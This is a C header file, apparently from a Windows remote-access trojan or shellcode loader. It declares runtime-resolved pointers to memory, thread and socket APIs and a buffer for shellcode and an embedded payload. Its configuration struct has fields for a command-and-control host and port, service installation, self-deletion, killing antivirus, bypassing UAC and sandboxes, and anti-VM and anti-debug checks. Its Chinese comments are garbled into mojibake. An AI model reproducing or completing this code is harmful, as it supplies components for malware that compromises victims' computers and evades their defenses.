#pragma once
#include<WinSock2.h>
#include <ws2tcpip.h>
//kernel32.dll
typedef LPVOID (WINAPI* mVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI* mVirtualFree)(LPVOID lpAddress, SIZE_T dwSize,DWORD dwFreeType);
typedef HANDLE (WINAPI* mCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef DWORD (WINAPI* mWaitForSingleObject)( HANDLE hHandle, DWORD dwMilliseconds);
typedef HMODULE (WINAPI* mLoadLibraryA)(_In_ LPCSTR lpLibFileName);
//Ws2_32.dll
typedef int (WSAAPI* mWSAStartup)(WORD wVersionRequested, LPWSADATA lpWSAData);
typedef SOCKET (WSAAPI* msocket)( int af,int type,int protocol);
typedef INT (WSAAPI* mgetaddrinfo)(PCSTR   pNodeName,PCSTR  pServiceName, const ADDRINFOA* pHints, PADDRINFOA* ppResult);
typedef u_short (WSAAPI* mhtons)(_In_ u_short hostshort);
typedef int (WSAAPI* mconnect)( SOCKET s,_In_reads_bytes_(namelen) const struct sockaddr FAR* name,_In_ int namelen);
typedef int (WSAAPI* msend)( SOCKET s,_In_reads_bytes_(len) const char FAR* buf, _In_ int len, _In_ int flags);
typedef int (WSAAPI* mrecv)( _In_ SOCKET s,_Out_writes_bytes_to_(len, return) __out_data_source(NETWORK) char FAR* buf,_In_ int len,_In_ int flags);
typedef int (WSAAPI* mWSACleanup)();
typedef struct  // ����Dat�ļ��ṹ
{
	char DNS[256];  //����
	int  Port;		//�˿�
	char UpGroup[32];					//���߷���
	char Packet[32];						//��ע
	char szCurrentDateTime[32];	//��װʱ��
	char ServiceName[50];			//��������
	char ServicePlay[50];				//������ʾ
	char ServiceDesc[150];			//��������
	char ReleasePath[100];			//��װ·��
	char ReleaseName[50];			//��װ����
	char szthisfile[MAX_PATH];    //��ǰ�����ļ�
	int  Dele_zc;								//��������
	BYTE ismove;							//�Ƿ���Ҫ�ƶ��ļ�
	BYTE dllorexe;							//�����ɵ�dll ����exe
	BYTE selfDel;							//��ɾ��
	BYTE kill;									//��ɱ
	BYTE Uac;									//�ƹ�uac
	BYTE weibu;								//�ƹ�΢��ɳ��
	BYTE vm;									//�������
	BYTE antidebug;						//������
	char Reserve[12];
}MODIFY_DATA;
typedef struct
{
	TCHAR Shellcode[10 * 1024];
	int  dwShellcodelen;
	TCHAR File[300 * 1024];
	int  dwFilelen;
	MODIFY_DATA modify_data;
	int RunSessionid;
}ShellcodeStr;
typedef struct
{
	mLoadLibraryA pmLoadLibraryA;
	mVirtualAlloc pmVirtualAlloc;
	mVirtualFree pmVirtualFree;
	mCreateThread pmCreateThread;
	mWaitForSingleObject pmWaitForSingleObject;
	mWSAStartup pmWSAStartup;
	msocket pmsocket;
	mgetaddrinfo pmgetaddrinfo;
	mhtons pmhtons;
	mconnect pmconnect;
	msend pmsend;
	mrecv pmrecv;
	mWSACleanup pmWSACleanup;
	SOCKET m_socket;
	ShellcodeStr* buff;
	MODIFY_DATA* data;
}INFO;
BOOL init(INFO* info);
DWORD WINAPI WorkThread(PVOID p);
void MyMemcpy(void* dst, void* src, size_t sizes);
DWORD_PTR fun();
DWORD GetOffset(PBYTE buff);

